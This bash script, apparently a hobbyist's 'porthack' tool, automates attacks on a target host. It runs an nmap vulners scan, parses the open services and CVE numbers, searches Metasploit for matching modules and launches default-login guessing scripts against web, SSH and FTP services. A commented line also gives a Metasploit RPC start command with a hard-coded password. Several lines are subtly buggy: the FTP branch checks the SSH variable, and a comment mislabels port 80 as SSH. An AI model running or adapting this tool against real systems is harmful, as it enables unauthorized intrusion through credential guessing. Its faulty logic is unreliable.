#!/usr/bin/env bash

# Prints totally rad ASCII art logo so you know I'm an
# e1337 h4x0r.
echo "porthack script by Jarlold"
echo """
    ____             __  __  __           __
   / __ \____  _____/ /_/ / / /___ ______/ /__
  / /_/ / __ \/ ___/ __/ /_/ / __ \`/ ___/ //_/
 / ____/ /_/ / /  / /_/ __  / /_/ / /__/ ,<
/_/    \____/_/   \__/_/ /_/\__,_/\___/_/|_|
----------------------------------------------
           Random Bullshit Go!
"""

# Check for:
# -> Nmap vulners scan [X]
#   --> Regex and cache which services are on which ports.
# -> put the CVEs into metasploit [X]
#    --> bring up CVEs (selector menu?)
# -> If port 80
#    --> run SQLMap
#    --> run wordpress hack
#    --> detect router page?
#        --> run router exploit
#    --> detect login page [X]
#        --> offer to skip process
#        --> run default logins [X]
# -> If SSH [X]
#    --> Try default SSH logins [X]
# -> If FTP
#    --> Try default FTP logins [X]
# -> If SQL
#    --> Try default SQL logins


# Uses the nmap "vulners.nse" vulnerability detection script
echo "Doing nmap vulnerability scan..."
scan1=$(nmap -sV --script vulners $1)
echo "  --> done!"
echo

# Use some regex headaches to just find the services
services="""$(echo "$scan1" | egrep --only-matching "([0-9]{1,5})\/...\s{1,20}\w{4,9}\s{1,20}\w{1,30}")"""

if [ "$(echo ${services} | wc -w)" != "0" ]; then
    echo "Found the following services:"
    for i in ${services// /_} # look i'm not a bash programmer...
    do
        echo "  --> ${i//_/ }" # trying to split this string was _weird_
    done
    echo
fi

# Find and count the number of CVEs
CVEs=$(echo ${scan1}  | grep --only-matching 'CVE-....-.....') # not actually sure if this counts *every* CVE format
#echo $CVEs
NumCVEs=$(echo ${CVEs} | grep --only-matching "CVE" | wc -l)
echo "And the following number of CVEs:"
echo "  --> found ${NumCVEs} CVEs"
echo


# Move this to the help text later I guess
#echo "Make sure msfrpcd is started, and is using the password specified"
#echo "if you don't know how to start it, or the password isn't right, just run"
#echo "msfrpcd -P hacksh1337 -S in a different terminal window, and leave it open"
#echo

# Print out the CVEs (unless there aren't any)
if [ ${NumCVEs} != 0 ]; then
#if [ 1 == 0 ]; then # SKIP MSF LOOKUP DEBUG
    # Runs a Python script to search for CVEs from Metasploit Framework
    echo "Searching Metasploit framework for CVE scripts..."
    msf_cves=$(python3 msf_cve_search.py $CVEs)
    num_msf_cves=$(echo ${msf_cves} | wc -w)
    if [ ${num_msf_cves} != 0 ]; then
        for i in ${msf_cves}
        do
            echo "  --> ${i}"
        done
    else
        echo "  --> None found :c"
    fi
    echo 
fi


# Check if anything is running on port 80, if so, assume it's ssh.
# and then run a script to try a bunch of default usernames and passwords on it
is_http=$(echo $services | grep --only-matching " 80/tcp")
if [ "${is_http}" = " 80/tcp" ]
then
    python3 ./try_default_logins.py http://$1
    echo
fi

# Check if ssh is running on the box, if so, assume it's on port 22.
# and then run a script to try a bunch of default usernames and passwords on it
#is_ssh=$(echo $services | grep --only-matching "open ssh")
ssh_port=$(echo $services | sed "s/\W//g" | grep -Po "[0-9]{1,}(?=tcpopenssh)")
if [ -n "$ssh_port" ]
then
    python3 ./try_default_ssh.py $1 $ssh_port
    echo
fi


# Check if ftp is running on the box, if so, assume it's on port 21.
# and then run a script to try a bunch of default usernames and passwords on it
#is_ftp=$(echo $services | grep --only-matching "open ftp")
ftp_port=$(echo $services | sed "s/\W//g" | grep -Po "[0-9]{1,}(?=tcpopenftp)")
#if [ "${is_ftp}" = "open ftp" ]
if [ -n "$ssh_port" ]
then
    for i in $ftp_port; do
      python3 ./try_default_ftp.py $1 $i
      echo
    done
fi
